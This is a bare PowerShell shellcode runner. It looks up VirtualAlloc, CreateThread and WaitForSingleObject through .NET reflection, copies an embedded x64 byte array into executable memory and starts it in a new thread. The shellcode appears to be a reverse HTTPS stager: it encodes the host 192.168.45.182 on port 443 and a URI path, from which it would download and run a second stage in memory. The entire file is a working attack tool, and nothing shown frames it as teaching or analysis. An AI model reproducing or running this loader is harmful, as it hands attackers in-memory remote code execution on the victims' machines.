﻿function lookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @($assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName)), $functionName))
	
}

function getDelegateSig {

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $typesArray,
		[Parameter(Position = 1)] [Type] $delType = [Void]
    )

	$Assembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($Assembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('DelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $ConstructorBuilder = $TypeBuilder.DefineConstructor(
      'RTSpecialName, HideBySig, Public', 
        [System.Reflection.CallingConventions]::Standard, 
          $typesArray).SetImplementationFlags('Runtime, Managed')

    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 
      'Public, HideBySig, NewSlot, Virtual', 
        $delType, 
          $typesArray).SetImplementationFlags('Runtime, Managed')

    $DelegateSig = $TypeBuilder.CreateType()

    return $DelegateSig
}

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x51,0x56,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0xd,0xac,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x41,0x58,0x41,0x58,0x5e,0x59,0x48,0x1,0xd0,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xf,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x35,0x2e,0x31,0x38,0x32,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xdb,0x0,0x0,0x0,0x2f,0x56,0x79,0x51,0x66,0x77,0x44,0x72,0x4d,0x43,0x68,0x6c,0x41,0x79,0x55,0x48,0x4c,0x4a,0x72,0x55,0x48,0x2d,0x67,0x36,0x34,0x5f,0x61,0x47,0x4d,0x41,0x6c,0x73,0x4a,0x5a,0x7a,0x56,0x44,0x41,0x4c,0x55,0x39,0x65,0x53,0x71,0x61,0x32,0x7a,0x6a,0x62,0x6a,0x53,0x62,0x54,0x78,0x6f,0x75,0x4d,0x51,0x6b,0x76,0x65,0x58,0x4d,0x7a,0x4a,0x4b,0x6a,0x7a,0x55,0x5f,0x58,0x68,0x6f,0x39,0x63,0x36,0x38,0x36,0x50,0x4b,0x48,0x6a,0x6e,0x53,0x51,0x53,0x4d,0x38,0x5a,0x66,0x2d,0x57,0x30,0x75,0x66,0x56,0x39,0x4b,0x50,0x63,0x5f,0x34,0x4b,0x51,0x5f,0x49,0x64,0x44,0x4a,0x66,0x5a,0x4f,0x41,0x6f,0x6c,0x38,0x46,0x75,0x5a,0x63,0x32,0x63,0x75,0x36,0x7a,0x66,0x34,0x51,0x62,0x74,0x52,0x61,0x47,0x2d,0x55,0x67,0x42,0x7a,0x5f,0x45,0x44,0x4b,0x4f,0x36,0x55,0x77,0x49,0x75,0x33,0x61,0x34,0x59,0x6b,0x39,0x31,0x71,0x67,0x4e,0x58,0x39,0x47,0x67,0x4b,0x4d,0x72,0x63,0x33,0x34,0x2d,0x48,0x77,0x4d,0x69,0x39,0x72,0x65,0x63,0x73,0x58,0x6f,0x32,0x50,0x31,0x6e,0x32,0x30,0x4b,0x74,0x6b,0x67,0x48,0x6b,0x32,0x38,0x30,0x37,0x66,0x67,0x34,0x68,0x41,0x4d,0x53,0x6a,0x44,0x51,0x32,0x46,0x4a,0x56,0x55,0x59,0x59,0x69,0x69,0x50,0x79,0x68,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5

$size = $buf.Length

$VirtualAllocA = lookupFunc kernel32.dll VirtualAlloc
$CreateThreadA = lookupFunc kernel32.dll CreateThread
$WaitForSingleObjectA = lookupFunc kernel32.dll WaitForSingleObject

$VirtualAllocSig = getDelegateSig -typesArray @([IntPtr], [int], [int], [int]) -delType "IntPtr"
$CreateThreadSig = getDelegateSig -typesArray @([IntPtr], [int], [IntPtr], [IntPtr], [int], [IntPtr]) -delType "int"
$WaitForSingleObjectSig = getDelegateSig -typesArray @([IntPtr], [uint32]) -delType "int"

$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocA, $VirtualAllocSig)
$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadA, $CreateThreadSig)
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectA, $WaitForSingleObjectSig)

[IntPtr]$addr = $VirtualAlloc.Invoke(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle = $CreateThread.Invoke(0,0,$addr,0,0,0);
$WaitForSingleObject.Invoke($thandle, [uint32]"0xFFFFFFFF")